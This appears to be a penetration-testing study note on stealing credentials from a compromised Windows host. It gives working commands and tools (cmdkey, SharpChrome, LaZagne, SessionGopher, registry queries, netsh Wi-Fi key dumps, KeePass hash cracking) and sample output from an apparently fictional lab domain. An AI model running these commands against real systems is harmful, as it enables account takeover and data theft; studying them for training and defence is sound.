# Further Credential Theft

Credential theft goes beyond static discovery in config files or scripts. A compromised system may hold volatile, cached, or encrypted credentials retrievable through various tools or Windows features.

This section explores practical methods to **steal credentials post-compromise**, using tools and built-in commands.
## 1. `cmdkey` Saved Credentials

Windows stores credentials for services like RDP or share access via the **Credential Manager**.

**List stored creds:**

```cmd
cmdkey /list
```

**Sample Output:**

```
Target: LegacyGeneric:target=TERMSRV/SQL01
User: inlanefreight\bob
```

**Reuse via runas:**

```powershell
runas /savecred /user:inlanefreight\bob "powershell.exe -c 'IEX...'"
```
## 2. Browser Credential Theft (Chrome)

Use **SharpChrome** to extract saved Chrome credentials:

```powershell
.\SharpChrome.exe logins /unprotect
```

It decrypts Chrome's local state file and outputs saved logins and cookies.
## 3. KeePass (.kdbx) Hash Extraction

Download `.kdbx` files and extract hashes using `keepass2john`, then crack with Hashcat:

```bash
python2 keepass2john.py Help_Desk.kdbx > hash.txt
hashcat -m 13400 hash.txt rockyou.txt
```

**Mode:** `13400`  
**Tool:** `Hashcat` or `John the Ripper`
## 4. MailSniper (Email Credential Search)

If the target has a Microsoft Exchange inbox:

- Use **MailSniper** to search for keywords: `"pass"`, `"creds"`, `"credentials"`   

Useful for discovering credentials accidentally shared or auto-forwarded via email.
## 5. LaZagne (All-in-One Extractor)

LaZagne can recover credentials from:

- Browsers    
- Sysadmin tools (WinSCP, OpenVPN, etc.)
- Autologon creds
- CredMan
- Memorydumps

**Run all modules:**

```powershell
.\lazagne.exe all
```

**Sample WinSCP recovery:**

```
Login: root
Password: Summer2020!
```
## 6. SessionGopher (RDP/SSH/WinSCP)

PowerShell script to dump:

- PuTTY / WinSCP / SuperPuTTY sessions    
- Saved `.rdp`, `.ppk`, `.sdtid` files

**Usage:**

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target localhost
```

Extracts credentials stored in HKEY_USERS.
## 7. Registry Stored Passwords

### Windows Autologon

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for:

- `DefaultUserName`    
- `DefaultPassword`
- `AutoAdminLogon`
### PuTTY Registry Sessions

If proxy credentials are saved:

```cmd
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
```

**Look for:**

- `ProxyUsername`    
- `ProxyPassword`

Accessible if attacker is local admin or same user.
## 8. Wi-Fi Credentials

Dump saved Wi-Fi profiles and extract pre-shared keys.

**List profiles:**

```cmd
netsh wlan show profile
```

**Extract password:**

```cmd
netsh wlan show profile <SSID> key=clear
```

**Example Output:**

```
Key Content            : ILFREIGHTWIFI-CORP123908!
```
## Summary Table

| Technique             | Target                       | Tool/Command               |
| --------------------- | ---------------------------- | -------------------------- |
| `cmdkey`              | Stored RDP/logon creds       | `cmdkey /list`             |
| Chrome creds          | Saved passwords              | `SharpChrome`              |
| KeePass cracking      | KeePass DB (.kdbx)           | `keepass2john` + `hashcat` |
| Email inbox search    | MS Exchange accounts         | `MailSniper`               |
| Multi-app dump        | Browsers, DBs, memory, DPAPI | `LaZagne`                  |
| RDP/SFTP session info | Registry + saved tools       | `SessionGopher`            |
| Registry secrets      | Autologon, PuTTY             | `reg query`                |
| Wi-Fi keys            | Pre-shared network passwords | `netsh wlan`               |
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Credential_Hunting #Credential_Sniffing